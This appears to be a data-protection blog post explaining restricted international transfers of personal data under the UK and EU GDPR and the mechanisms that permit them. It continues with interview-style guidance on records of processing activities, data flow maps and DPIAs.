&lt;p&gt;The &lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;UK GDPR (General Data Protection Regulation)&lt;/a&gt; offers a high standard of data protection – but its scope is limited to organisations based or operating in the UK.&lt;/p&gt;



&lt;p&gt;So, what happens if you transfer the personal data outside the country?&lt;/p&gt;



&lt;p&gt;The GDPR requires UK residents’ data to be offered the &lt;em&gt;same&lt;/em&gt; level of protection, whether processed at home or abroad.&lt;/p&gt;



&lt;p&gt;How? By demanding that organisations put adequate safeguards in place for ‘restricted transfers’ of personal data.&lt;/p&gt;



&lt;p&gt;This blog explains what restricted transfers are, and the safeguards you’re allowed to rely on under the UK GDPR. I’ll also touch on the EU GDPR, where appropriate.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;In this guide&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#restricted-transfer"&gt;What restricted transfers are&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-1"&gt;Mechanism #1: Adequacy decisions&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-2"&gt;Mechanism #2: IDTA (international data transfer agreement)&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-3"&gt;Mechanism #3: BCRs (binding corporate rules)&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-4"&gt;Mechanism #4: Codes of conduct&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-5"&gt;Mechanism #5: Certification&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-6"&gt;Mechanism #6: Derogations&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-7"&gt;Mechanism #7: Compelling legitimate interest&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#how-to-choose"&gt;How to choose the right mechanism&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="restricted-transfer"&gt;What is a ‘restricted transfer’ under the UK GDPR?&lt;/h2&gt;



&lt;p&gt;To send personal data outside the UK – i.e. to make a ‘restricted transfer’ – data controllers and processors must provide an adequate level of security to protect:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The personal data being processed; and&lt;/li&gt;



&lt;li&gt;The rights and freedoms of data subjects.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Organisations subject to the UK GDPR must also consider relevant laws of the countries involved, and prevent the personal data from being accessed by other entities* without the data subject’s knowledge.&lt;/p&gt;



&lt;p&gt;There are three conditions for the transfer to be considered ‘restricted’ under the UK GDPR:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;The personal data you want to transfer is subject to the UK GDPR.&lt;/li&gt;



&lt;li&gt;You’re initiating and agreeing to send personal data to (or make it available to) a recipient outside the UK.&lt;/li&gt;



&lt;li&gt;The recipient is a separate, legally distinct organisation (or individual) from you.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Restricted transfers can include Cloud storage, automated systems for data processing, and even analytics providers.&lt;/p&gt;



&lt;p&gt;&lt;em&gt;*These ‘other entities’ include law enforcement agencies, which are more prone to accessing people’s data under local national laws. For example, the FBI uses FISA Section 702 to collect ‘foreign intelligence information’ from non-US residents.&lt;/em&gt;&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;How different is that from the EU GDPR?&lt;/h3&gt;



&lt;p&gt;The requirements are broadly the same, but looking at it from an EEA rather than a UK perspective:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The data controller/processor linked to processing activity is subject to the EU GDPR.&lt;/li&gt;



&lt;li&gt;The controller/processor transfers the data, or makes it available to, another organisation.&lt;/li&gt;



&lt;li&gt;That organisation is outside the EEA, or it’s an international organisation.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Let’s look at seven mechanisms for international personal data transfers under the UK and, where applicable, EU GDPR.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-1"&gt;Mechanism #1: Adequacy decisions&lt;/h2&gt;



&lt;p&gt;Relying on an &lt;strong&gt;adequacy decision&lt;/strong&gt; is usually the easiest safeguard to rely on for international transfers.&lt;/p&gt;



&lt;p&gt;The UK’s &lt;strong&gt;adequacy regulations&lt;/strong&gt; grant countries or territories deemed to provide ‘adequate’ protection to personal data, and to data subjects’ rights and freedoms, an adequacy decision.&lt;/p&gt;



&lt;p&gt;That means personal data may flow freely between the UK and these ‘adequate’ countries. The EU GDPR offers an equivalent mechanism under Article 45 (‘transfers on the basis of an adequacy decision’).&lt;/p&gt;



&lt;p&gt;Under the UK GDPR’s adequacy regulations, the EEA and all countries with an adequacy decision under the EU GDPR are covered. These are:&lt;/p&gt;



&lt;ul class="wp-block-list multi-column"&gt;
&lt;li&gt;Andorra&lt;/li&gt;



&lt;li&gt;Argentina&lt;/li&gt;



&lt;li&gt;Austria&lt;/li&gt;



&lt;li&gt;Belgium&lt;/li&gt;



&lt;li&gt;Bulgaria&lt;/li&gt;



&lt;li&gt;Croatia&lt;/li&gt;



&lt;li&gt;Cyprus&lt;/li&gt;



&lt;li&gt;Czech Republic&lt;/li&gt;



&lt;li&gt;Denmark&lt;/li&gt;



&lt;li&gt;Estonia&lt;/li&gt;



&lt;li&gt;Faroe Islands&lt;/li&gt;



&lt;li&gt;Finland&lt;/li&gt;



&lt;li&gt;France&lt;/li&gt;



&lt;li&gt;Germany&lt;/li&gt;



&lt;li&gt;Gibraltar&lt;/li&gt;



&lt;li&gt;Greece&lt;/li&gt;



&lt;li&gt;Guernsey&lt;/li&gt;



&lt;li&gt;Hungary&lt;/li&gt;



&lt;li&gt;Iceland&lt;/li&gt;



&lt;li&gt;Ireland&lt;/li&gt;



&lt;li&gt;Isle of Man&lt;/li&gt;



&lt;li&gt;Israel&lt;/li&gt;



&lt;li&gt;Italy&lt;/li&gt;



&lt;li&gt;Jersey&lt;/li&gt;



&lt;li&gt;Latvia&lt;/li&gt;



&lt;li&gt;Liechtenstein&lt;/li&gt;



&lt;li&gt;Lithuania&lt;/li&gt;



&lt;li&gt;Luxembourg&lt;/li&gt;



&lt;li&gt;Malta&lt;/li&gt;



&lt;li&gt;Netherlands&lt;/li&gt;



&lt;li&gt;New Zealand&lt;/li&gt;



&lt;li&gt;Norway&lt;/li&gt;



&lt;li&gt;Poland&lt;/li&gt;



&lt;li&gt;Portugal&lt;/li&gt;



&lt;li&gt;Romania&lt;/li&gt;



&lt;li&gt;Slovakia&lt;/li&gt;



&lt;li&gt;Slovenia&lt;/li&gt;



&lt;li&gt;South Korea&lt;/li&gt;



&lt;li&gt;Spain&lt;/li&gt;



&lt;li&gt;Sweden&lt;/li&gt;



&lt;li&gt;Switzerland&lt;/li&gt;



&lt;li&gt;Uruguay&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;In addition, Canada, Japan and the &lt;a href="https://www.itgovernance.co.uk/blog/expert-insight-andrew-snow" rel="noreferrer noopener" target="_blank"&gt;US&lt;/a&gt; have received partial adequacy decisions under both the UK and EU GDPR.&lt;/p&gt;



&lt;p&gt;Also note that personal data can flow freely between public authorities internationally.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;What about Brexit?&lt;/h3&gt;



&lt;p&gt;When it comes to international transfers, we’ve only seen one meaningful change in recent years: &lt;a href="https://www.itgovernance.co.uk/blog/expert-insight-andrew-snow" rel="noreferrer noopener" target="_blank"&gt;Schrems II&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Though there &lt;em&gt;are&lt;/em&gt; differences between the UK and EU GDPR, of course, for transfers to third countries, little has changed because of the mutual adequacy decision.&lt;/p&gt;



&lt;p&gt;Put differently, personal data may flow freely between the UK and EU/EEA. And since the remaining countries with adequacy decisions are identical for the UK and EU GDPR, little has changed.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-2"&gt;Mechanism #2: International data transfer agreement&lt;/h2&gt;



&lt;p&gt;Under the EU GDPR, we had the SCCs (standard contractual clauses). After the EU updated them, the UK ICO (Information Commissioner’s Office) updated its equivalent mechanism to the &lt;strong&gt;IDTA: international data transfer agreement&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;Organisations subject to the UK GDPR must now use the IDTA, as the transition period ended in March 2024.&lt;/p&gt;



&lt;p&gt;The idea for both the EU SCCs and UK IDTA is that they’re model contractual clauses, available on the &lt;a href="https://commission.europa.eu/law/law-topic/data-protection/international-dimension-data-protection/standard-contractual-clauses-scc_en" rel="noreferrer noopener" target="_blank"&gt;European Commission&lt;/a&gt; and &lt;a href="https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/international-transfers/international-data-transfer-agreement-and-guidance/" rel="noreferrer noopener" target="_blank"&gt;ICO&lt;/a&gt; websites respectively. If you use them without change, they should comply with the &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-article-28-contracts-what-you-need-to-know" rel="noreferrer noopener" target="_blank"&gt;Article 28 requirements&lt;/a&gt; of the EU and UK GDPR.&lt;/p&gt;



&lt;p&gt;More specifically, you complete the first 8 pages the IDTA. The remaining 28 pages are all the mandatory clauses you cannot amend nor remove.&lt;/p&gt;



&lt;p&gt;You &lt;em&gt;can&lt;/em&gt;, however, add more clauses, but these may not change or take away from the meaning of the pre-written text.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;Remember the transfer risk assessment tool!&lt;/h3&gt;



&lt;p&gt;Many people overlook the TRA (transfer risk assessment) tool – a 41-page risk assessment also on the &lt;a href="https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/international-transfers/international-data-transfer-agreement-and-guidance/" rel="noreferrer noopener" target="_blank"&gt;ICO website&lt;/a&gt; – which sits alongside the IDTA.&lt;/p&gt;



&lt;p&gt;This TRA is designed to tell you whether you can go ahead with the international transfer of personal data in question.&lt;/p&gt;



&lt;p&gt;Like any other &lt;a href="https://www.itgovernance.co.uk/blog/why-risk-assessments-are-essential-for-gdpr-compliance." rel="noreferrer noopener" target="_blank"&gt;risk assessment&lt;/a&gt;, you must determine the level of risk, and decide whether it’s acceptable as-is, or requires treatment to bring it down to an acceptable level. You must also include them on your risk register.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-3"&gt;Mechanism #3: Binding corporate rules&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;BCRs (binding corporate rules) &lt;/strong&gt;under both the UK and EU GDPR are for international organisations.&lt;/p&gt;



&lt;p&gt;Suppose you have offices in the UK, Australia and mainland China. If you took the IDTA/SCC approach here, you’d need &lt;em&gt;six&lt;/em&gt; contracts (and risk assessments), just to have the free flow of personal data between all entities.&lt;/p&gt;



&lt;p&gt;That’s where the BCRs come in. These rules allow all entities involved within a global organisation to have data flow freely between all entities within it.&lt;/p&gt;



&lt;p&gt;In effect, the BCRs are a contract that, like the IDTA, covers the requirements of Article 28, but the ICO (or, for the EU GDPR, your supervisory authority) must sign it off. &lt;a href="https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/international-transfers/guide-to-binding-corporate-rules/a-uk-bcr-addendum/" rel="noreferrer noopener" target="_blank"&gt;Its website&lt;/a&gt; has more information about the application process.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;That’s for the GDPR. What about international privacy laws?&lt;/h3&gt;



&lt;p&gt;Using my earlier example again, Australia and mainland China each have their own national laws, as do most countries around the world. So, your BCRs must reference the Australian Privacy Act and the Chinese Personal Information Protection Law.&lt;/p&gt;



&lt;p&gt;However, when dealing with international organisations, you &lt;em&gt;can&lt;/em&gt; get complications on the other (non-UK/EU) side.&lt;/p&gt;



&lt;p&gt;For example, I remember doing some GDPR work for a large Saudi Arabian organisation. A national law prevented it from being allowed to report data breaches with a risk to data subjects outside the country.&lt;/p&gt;



&lt;p&gt;For clarity: it may &lt;a href="https://www.itgovernance.co.uk/green-papers/data-breach-survival-guide" rel="noreferrer noopener" target="_blank"&gt;report data breaches&lt;/a&gt; to the local authorities, but not internationally. And where you have competing laws, the strictest always applies.&lt;/p&gt;



&lt;p&gt;When dealing with a situation like that, you need to find a workaround – for example, publish a statement your website like: ‘Please be aware that you might want to change your password at your earliest opportunity.’&lt;/p&gt;



&lt;p&gt;It’s not ideal, but it makes the best of an awkward situation. It’s taking a risk-based approach to compliance.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-4"&gt;Mechanism #4: Codes of conduct&lt;/h2&gt;



&lt;p&gt;Under Article 40 of both GDPRs, organisations can rely on approved &lt;strong&gt;codes of conduct&lt;/strong&gt; to transfer data internationally. However, the UK doesn’t currently have any, so can’t use them.&lt;/p&gt;



&lt;p&gt;The EU, on the other hand, has multiple Article 40 codes of conduct available for certain types of data processing, within certain third countries.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-5"&gt;Mechanism #5: Certification&lt;/h2&gt;



&lt;p&gt;Another provision under Article 42 of both GDPRs is &lt;strong&gt;certification&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;The UK has several certification schemes. However, the only one approved under Article 42 that can also be used for international transfers is &lt;a href="https://ico.org.uk/for-organisations/advice-and-services/certification-schemes/certification-scheme-register/adisa-ict-asset-recovery-certification-80/" rel="noreferrer noopener" target="_blank"&gt;ADISA ICT Asset Recovery Certification 8.0&lt;/a&gt;. Furthermore, this scheme is only available to processors or sub-processors providing data sanitisation services.&lt;/p&gt;



&lt;p&gt;The EU GDPR currently has &lt;a href="https://www.itgovernance.co.uk/europrivacy" rel="noreferrer noopener" target="_blank"&gt;Europrivacy&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.1.0/72x72/2122.png" style="height: 1em;" /&gt;&lt;sup&gt;/&lt;/sup&gt;®&lt;/a&gt;, but this certification mechanism currently doesn’t account for international transfers, and can’t be used outside the EU or EEA.&lt;/p&gt;



&lt;p&gt;However, Europrivacy is currently being extended to meet the Article 46(2)(f) requirements of the EU GDPR as an approved mechanism for international transfers.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-6"&gt;Mechanism #6: International data transfer derogations&lt;/h2&gt;



&lt;p&gt;Article 49 of the UK and EU GDPR allow “&lt;strong&gt;derogations for specific situations&lt;/strong&gt;”. You should only rely on this mechanism if you can’t rely on any of the above.&lt;/p&gt;



&lt;p&gt;The derogations permit you to make restricted transfers if:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The data subject has explicitly consented;&lt;/li&gt;



&lt;li&gt;The transfer is necessary to perform a contract;&lt;/li&gt;



&lt;li&gt;The transfer is necessary to protect someone’s vital interests;&lt;/li&gt;



&lt;li&gt;The transfer is necessary for “important reasons of public interest”;&lt;/li&gt;



&lt;li&gt;The transfer is necessary to establish, exercise or defend legal claims; or&lt;/li&gt;



&lt;li&gt;You’re making the transfer from a register intended to provide information to the public.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;These types of transfers should be infrequent and concern a limited number of data subjects.&lt;/p&gt;



&lt;p&gt;Also, if you rely on a derogation, make sure you record (in your &lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;Article 30 ROPAs&lt;/a&gt;) the safeguards you’ve put in place for the data transfer.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-7"&gt;Mechanism #7: Compelling legitimate interest&lt;/h2&gt;



&lt;p&gt;The final mechanism is &lt;strong&gt;compelling legitimate interests&lt;/strong&gt;. Specifically, both Regulations say in Article 49(1)(g):&lt;/p&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;[The international transfer] is necessary for the purposes of compelling legitimate interests pursued by the controller which are not overridden by the interests or rights and freedoms of the data subject, and the controller has assessed all the circumstances surrounding the data transfer and has on the basis of that assessment provided suitable safeguards with regard to the protection of personal data.&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;As is standard with legitimate interests, you must inform the data subject of that interest, as well the international transfer. You must also inform your supervisory authority.&lt;/p&gt;



&lt;p&gt;Unlike the &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-lawful-bases-for-processing-with-examples" rel="noreferrer noopener" target="_blank"&gt;lawful basis&lt;/a&gt; legitimate interests, there’s no assessment for this. However, you must keep records that show your decision-making process around what the legitimate interest was, why you deemed this the appropriate transfer method, that you’ve informed your data subjects, etc.&lt;/p&gt;



&lt;p&gt;Like the derogations, this mechanism should be used in moderation.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="how-to-choose"&gt;How to choose the right mechanism&lt;/h2&gt;



&lt;p&gt;Seven mechanisms, with variations between the UK and EU GDPR, can feel overwhelming.&lt;/p&gt;



&lt;p&gt;The good news is that those differences are minor, as both GDPRs share the same principles. Moreover, the bulk of personal data transfers are covered by the first three mechanisms:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Adequacy&lt;/li&gt;



&lt;li&gt;IDTA/SCCs&lt;/li&gt;



&lt;li&gt;BCRs&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Between these three, the correct mechanism is often fairly obvious.&lt;/p&gt;



&lt;p&gt;In short, rely on adequacy if you can. If you can’t, use the BCRs if you’re an international organisation; otherwise, use the IDTA (UK GDPR) or SCCs (EU GDPR).&lt;/p&gt;

&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Records-of-processing-activities"&gt;Records of processing activities&lt;/h2&gt;



&lt;p&gt;&lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;Previously&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;, we discussed ROPAs. One practical tip you gave was to first list all&lt;/strong&gt; &lt;strong&gt;processing activities before adding lots of data points.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Another tip was to consider your ROPA a ‘one-stop shop’ – having all your information in one place. Could you elaborate?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;ROPAs are a single place for you to understand your processing activities. And not just you – other stakeholders, too.&lt;/p&gt;



&lt;p&gt;Suppose that the ICO [Information Commissioner’s Office] audits you. The first thing the regulator will likely ask for are your Article 30 ROPAs. If the ICO then wants to know, say, what &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-lawful-bases-for-processing-with-examples" rel="noreferrer noopener" target="_blank"&gt;lawful basis&lt;/a&gt; you’re relying on, they should be able to see it right there, in that ROPA.&lt;/p&gt;



&lt;p&gt;Your ROPA should already have a column for lawful basis. Plus, if that lawful basis is legitimate interests, you could then add columns for:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;A brief outline of that legitimate interest; and&lt;/li&gt;



&lt;li&gt;A hyperlink to your LIA [legitimate interests assessment], proving the validity of that legitimate interest.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;On the other hand, if your lawful basis is consent, you could also have a column that hyperlinks to evidence of that consent:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;When and how did the data subject give their consent?&lt;/li&gt;



&lt;li&gt;What information did you give them at the time?&lt;/li&gt;



&lt;li&gt;What &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-managing-the-right-to-withdraw-consent" rel="noreferrer noopener" target="_blank"&gt;withdrawal mechanism&lt;/a&gt; do you use?&lt;/li&gt;



&lt;li&gt;And so on.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The ROPA is a high-level summary that should provide an immediate overview of:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;All your processing activities; and&lt;/li&gt;



&lt;li&gt;All the risks associated with them.&lt;/li&gt;
&lt;/ul&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;What sort of risks are you referring to here? And how can a ROPA give an overview of them?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;The risks the GDPR always focuses on – risks to the rights and freedoms of data subjects.&lt;/p&gt;



&lt;p&gt;As to how a ROPA provides an overview – you should have columns that indicate:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;How you’re processing and securing the personal data, using appropriate &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-article-32-your-guide-to-the-requirements" rel="noreferrer noopener" target="_blank"&gt;technical and organisational measures&lt;/a&gt;;&lt;/li&gt;



&lt;li&gt;What Article 6 lawful basis you’re relying on and, for &lt;a href="https://www.itgovernance.co.uk/blog/the-gdpr-do-you-know-the-difference-between-personal-data-and-sensitive-data" rel="noreferrer noopener" target="_blank"&gt;special category data&lt;/a&gt;, Article 9 exemption;&lt;/li&gt;



&lt;li&gt;How you’re meeting the Article 5 data protection principles;&lt;/li&gt;



&lt;li&gt;What data subject rights are applicable;&lt;/li&gt;



&lt;li&gt;Whether international transfers are taking place, what mechanism you’re relying on to legally transfer personal data to a third country, and how you’re securing those transfers; and&lt;/li&gt;



&lt;li&gt;The level of risk of the processing activity, and if the risk is high, that you’ve performed a DPIA, with a link to that assessment.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The GDPR doesn’t require you to include all this in your ROPA, but this list &lt;em&gt;does&lt;/em&gt; reflect the Regulation’s requirements, and it provides a convenient means of showing that you’re complying with them.&lt;/p&gt;



&lt;p&gt;Collecting this data in your ROPA also gives a simple, clear overview of these data points, which in turn gives you a much clearer picture of your risks.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Data-flow-mapping"&gt;Data flow mapping&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Let’s dig into what you said about “how you’re processing and securing the personal data”. What would that look like in a ROPA?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;You’d have a group of columns in your ROPA that look something like this:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-46670" height="209" src="https://www.itgovernance.co.uk/blog/wp-content/uploads/2024/08/image-5.png" width="938" /&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;You can also add columns for implemented security measures, including information on encryption. For instance, you might have a drop-down menu with items like:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Pseudonymisation&lt;/li&gt;



&lt;li&gt;Anonymisation&lt;/li&gt;



&lt;li&gt;Encryption&lt;/li&gt;



&lt;li&gt;Plaintext&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;You could also add details on the specific encryption protocol, particularly if your organisation uses more than one.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;And you then feed this information into a data flow map?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Correct, but a data flow map also takes things further. It &lt;em&gt;visualises&lt;/em&gt; the data flows, so you can easily see:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Which departments are using what data; and&lt;/li&gt;



&lt;li&gt;The risks your data might be subject to.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;For example, if your data flow map shows you’re storing a lot of personal data in &lt;a href="https://www.itgovernance.co.uk/blog/the-14-cloud-security-principles-explained" rel="noreferrer noopener" target="_blank"&gt;Cloud&lt;/a&gt;-based databases, have you implemented appropriate &lt;a href="https://www.itgovernance.co.uk/blog/what-is-access-control" rel="noreferrer noopener" target="_blank"&gt;access control&lt;/a&gt;?&lt;/p&gt;



&lt;p&gt;The nature of the Cloud is that you can access it from anywhere with an Internet connection, so restricting access is vital, particularly if staff work remotely. If your employees are also based &lt;a href="https://www.itgovernance.co.uk/blog/transferring-personal-data-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;internationally&lt;/a&gt;, ensure you’re meeting local laws as well as the UK GDPR requirements.&lt;/p&gt;



&lt;p&gt;Another thing to pay attention to is configurations – you really don’t want to inadvertently make your database publicly available, so did you configure it properly?&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;So, your data flow maps help organisations secure their personal data?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Yes. Because data flow maps show you where you’re storing, processing and transmitting personal data, they give a clear idea of where your security risks are. And&lt;/p&gt;



&lt;p&gt;They also clearly show who’s using the data, and that tells you who to talk to in order to better understand and address those risks. This mapping exercise will highlight data you might be collecting but not using, in which case you should destroy it to:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Meet your GDPR requirements [e.g. the &lt;a href="https://www.itgovernance.co.uk/blog/what-is-data-minimisation-definition-examples" rel="noreferrer noopener" target="_blank"&gt;data minimisation&lt;/a&gt; principle];&lt;/li&gt;



&lt;li&gt;Reduce the risks [the impact of a data breach]; and&lt;/li&gt;



&lt;li&gt;Save you money [storage costs].&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;h2 class="wp-block-heading" id="Data-protection-impact-assessment"&gt;Data protection impact assessment&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;You &lt;/strong&gt;&lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;previously&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; suggested using ROPAs in conjunction with tools like DPIAs, and that  detailed ROPAs  help you conduct DPIAs and &lt;/strong&gt;&lt;a href="https://www.itgovernance.co.uk/blog/why-risk-assessments-are-essential-for-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;risk assessments&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; further down the line. Could you elaborate?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;I see all three – ROPAs, data flow maps and DPIAs – as tools to help you understand your processing activities.&lt;/p&gt;



&lt;p&gt;I don’t look at the ROPAs in isolation: all &amp;nbsp;three &amp;nbsp;together enable you to demonstrate accountability and compliance with Article 30.&lt;/p&gt;



&lt;p&gt;But the &lt;em&gt;focus&lt;/em&gt; of each tool is different, of course. For instance, DPIAs revolve around risk – the idea is that you only need to conduct a DPIA if the processing presents a&amp;nbsp;&lt;em&gt;high&lt;/em&gt;&amp;nbsp;risk to the rights and freedoms of data subjects.* Which you then look to address, to reduce that risk to an acceptable level.&lt;/p&gt;



&lt;p&gt;&lt;em&gt;*It’s also worth checking Article 35(3) of the GDPR for specific examples that constitute high-risk processing, as well as the&amp;nbsp;&lt;/em&gt;&lt;a href="https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/accountability-and-governance/data-protection-impact-assessments-dpias/examples-of-processing-likely-to-result-in-high-risk/" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;list of examples&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&amp;nbsp;on the ICO website and the&amp;nbsp;&lt;/em&gt;&lt;a href="https://ec.europa.eu/newsroom/article29/items/611236" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;Article 29 Working Party guidelines&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&amp;nbsp;(endorsed by the EDPB).&lt;/em&gt;&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;How can organisations track their risks?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Specific to risks relevant to the GDPR, again, you can create a group of columns in your ROPA to track key data points. If you don’t feel comfortable with spreadsheets, an automation tool can help by providing a template that you work within. In a spreadsheet, this might look something like this:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;

